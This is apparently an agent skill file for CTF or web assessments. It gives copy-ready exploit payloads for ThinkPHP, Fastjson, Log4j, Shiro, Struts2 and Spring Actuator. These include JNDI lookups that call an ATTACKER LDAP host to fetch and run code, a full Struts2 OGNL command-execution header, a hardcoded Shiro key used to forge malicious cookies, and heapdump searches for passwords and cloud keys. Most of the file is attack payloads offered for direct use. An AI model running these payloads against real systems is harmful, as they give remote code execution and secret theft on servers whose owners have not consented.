name: web-framework-cve
description: High-density exploit knowledge for common web frameworks (ThinkPHP, Fastjson, Log4j, Shiro, Struts2, Spring). Each entry gives fingerprint, the exact CVE/payload path, and a self-verify step. "Know it = instant solve". Use when a web target runs a known framework and generic methodology stalls.
---

# Web Framework CVE (fingerprint → CVE → payload)

Authorized CTF/assessment use. Frameworks are "known-vuln" challenges: identify the framework+version, apply the matching CVE, verify. Do NOT re-derive from scratch. Payloads below are the standard proof points; adapt the command/URL to the specific target, then self-verify before submitting the flag.

## 1. ThinkPHP (PHP) — RCE

**Fingerprint:** headers/HTML leak `thinkphp`, URL like `/index.php?s=/xxx`, error page shows ThinkPHP logo/version, `/index.php?s=index/\think\app/invokefunction` exists.

**TP 5.0.x RCE (CVE-2018-1002015 / invokefunction):**
```
GET /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
```
**TP 5.1.x / 5.2.x RCE (request cache / method override):**
```
POST /index.php?s=captcha
_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
```
**TP 5.0.23 + 5.1.x `app/invokefunction` blocked → `Request` chain:** try
```
/index.php?s=index/\think\Request/input&filter[]=system&data=id
/index.php?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
```
**Verify:** `id` returns uid=... → RCE. Then read the flag file (webroot or `/flag`).

## 2. Fastjson (Java) — Deserialization RCE

**Fingerprint:** JSON API accepting `application/json`, error stack shows `com.alibaba.fastjson`. Version matters (1.2.24-1.2.47 classic autoType; ≤1.2.80 has later gadgets).

**Classic (≤1.2.47) autoType bypass chain — JNDI:**
```
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://ATTACKER/Exploit","autoCommit":true}
```
**TemplateImpl / RMI variants:** use JdbcRowSetImpl JNDI first (no extra gadget classes needed). Stand up a JNDI/LDAP server (or use `jndi:`/`rmi:`), the target fetches and runs your class → RCE.

**No-outbound (BLIND) fastjson check:** send `{"@type":"java.net.Inet4Address","val":"dnslog.xxx"}` and watch for a DNS hit → confirms fastjson + autoType on.

**Verify:** JNDI callback received → RCE. Read flag.

## 3. Log4j (Java) — JNDI injection (Log4Shell)

**Fingerprint:** any header/param echoed into logs (User-Agent, X-Forwarded-For, `${jndi:...}` gets evaluated). Java app, log4j2 <2.17.

**Payload:** inject a JNDI lookup into a logged field:
```
User-Agent: ${jndi:ldap://ATTACKER/a}
GET /${jndi:ldap://ATTACKER/a}   (URL path also works)
```
**Verify:** your LDAP/DNS server receives a callback → confirmed. Then serve a malicious class for RCE (`${jndi:ldap://ATTACKER/Exploit}`).

## 4. Apache Shiro (Java) — rememberMe deserialization

**Fingerprint:** response sets `Set-Cookie: rememberMe=deleteMe;` (that exact cookie name is the tell).

**Exploit path:**
1. Confirm rememberMe cookie present.
2. Find the hardcoded/default key (common: `kPH+bIxk5D2deZiIxcaaaA==`, or from the app/known key list) — Shiro AES-CBC encrypts the serialized object with it.
3. Generate a malicious `rememberMe` cookie: ysoserial gadget (CommonsCollections/CommonsBeanutils) → AES encrypt with the key → base64 → set as cookie.
4. Send request with that cookie → RCE.

**No-key trick:** try the well-known default key list first (many CTF boxes ship the demo key). Verify with a sleep/dns gadget before full RCE.

## 5. Struts2 (Java) — OGNL RCE

**Fingerprint:** URLs end in `.action` / `.do`; error pages show Struts2 version.

**Classic payloads (try in order):**
- S2-045 (Content-Type header OGNL, ≤2.3.31/2.5.10):
```
Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```
- S2-057 / S2-059 (namespace / double-eval) as alternates when S2-045 fails.

**Verify:** `id` in response → RCE.

## 6. Spring — Actuator + SpEL

**Fingerprint:** `/actuator`, `/actuator/env`, `/actuator/heapdump` reachable (Spring Boot).

**Actuator env → RCE (CVE-2022-22947 Gateway, or heapdump secrets):**
1. `/actuator/env` leaks config (DB creds, secrets).
2. `/actuator/heapdump` download → strings → JWT secrets / passwords / cloud keys.
3. Spring Cloud Gateway CVE-2022-22947: SpEL in `routes` → refresh → RCE.
4. If only heapdump: grep the dump for `secret`, `password`, `AKIA`, `jdbc:`.

**Verify:** read config/secrets → escalate to flag.

## Cross-cutting
- **Fingerprint first** (header/error/URL/response telltale), then apply the exact CVE — don't guess.
- Always **self-verify** (a sleep/DNS/JNDI callback before committing to RCE; confirm the command output).
- Version is the key discriminator; a payload for the wrong minor version fails silently — match version, then pick payload.
